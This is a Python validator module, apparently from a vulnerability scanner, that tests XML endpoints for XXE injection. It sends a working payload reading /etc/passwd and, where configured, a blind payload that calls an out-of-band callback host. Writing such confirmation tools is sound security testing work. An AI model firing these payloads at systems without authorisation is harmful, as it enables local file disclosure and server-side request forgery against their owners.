"""XXE validator (minimal local-file proof; blind needs OOB)."""

from __future__ import annotations

NAME = "xxe"


def validate(vctx) -> dict:
    marker = vctx.marker()
    payload = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        f"<root>&xxe;<!--{marker}--></root>"
    )
    response = vctx.post(vctx.item["endpoint"], data=payload, headers={"Content-Type": "application/xml"})
    if "root:x:0:0" in (response.text or ""):
        return vctx.result(
            status="Confirmada",
            payload="<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
            evidence="conteúdo de /etc/passwd retornado pela entidade XML",
            impact="Leitura de arquivos locais e potencial SSRF via entidades externas.",
            severity="high",
            title="XML external entity injection",
        )
    if vctx.oob_url:
        token = vctx.marker()
        oob_probe = vctx.oob_url.rstrip("/") + "/" + token
        blind_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE root [<!ENTITY % xxe SYSTEM "' + oob_probe + '"> %xxe;]>'
            "<root/>"
        )
        vctx.post(vctx.item["endpoint"], data=blind_payload, headers={"Content-Type": "application/xml"})
        return vctx.result(
            status="Provável (parcial)",
            payload="entidade externa para OOB",
            evidence="payload OOB enviado; confirmação depende de callback externo",
            impact="Possível XXE cego; não confirmado sem callback observado.",
            severity="medium",
            title="Possível XXE cego",
            impact_demonstrated=False,
            prerequisites="callback OOB observado",
            counter_evidence="sem confirmação de callback",
        )
    return vctx.result(
        status="Não reproduzida",
        payload="&xxe;",
        evidence="arquivo local não retornado e sem sink OOB configurado",
        impact="",
        severity=vctx.item.get("severity_declared") or "high",
        title="XXE não reproduzido",
    )
